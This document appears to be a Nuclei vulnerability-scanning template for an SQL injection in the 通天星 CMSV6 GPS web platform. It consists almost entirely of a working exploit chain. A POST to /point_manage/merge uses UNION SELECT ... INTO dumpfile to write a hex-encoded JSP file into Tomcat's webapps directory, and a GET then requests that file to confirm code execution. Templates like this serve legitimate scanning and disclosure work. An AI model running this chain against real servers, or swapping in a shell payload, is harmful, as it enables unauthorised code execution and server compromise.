http:
    - matchers:
        - condition: and
          dsl:
            - status_code_1 == 200
            - status_code_2 == 200
            - contains(body_2, "SecExplorer666")
          type: dsl
      matchers-condition: and
      raw:
        - |
          POST /point_manage/merge HTTP/1.1
          User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2882.93 Safari/537.36
          Content-Type: application/x-www-form-urlencoded
          Host: {{Hostname}}
          Content-Length: 440

          id=1&name=1' UNION SELECT%0aNULL, 0x3c25206f75742e7072696e7428225365634578706c6f72657236363622293b206e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b20253e,NULL,NULL,NULL,NULL,NULL,NULL
          INTO dumpfile '../../tomcat/webapps/gpsweb/{{filename}}.jsp' FROM user_session a
          WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8
        - |
          GET /{{filename}}.jsp HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2882.93 Safari/537.36
id: G-sky-CMSV6-pointManage-sqli-RCE
info:
    author: pitaya
    name: 通天星CMSV6 pointManage存在SQL注入可写入文件RCE
    severity: high
    tags:
        - gpsweb
        - GPSweb
        - tomcat
        - GPS
variables:
    filename: '{{rand_base(10)}}'
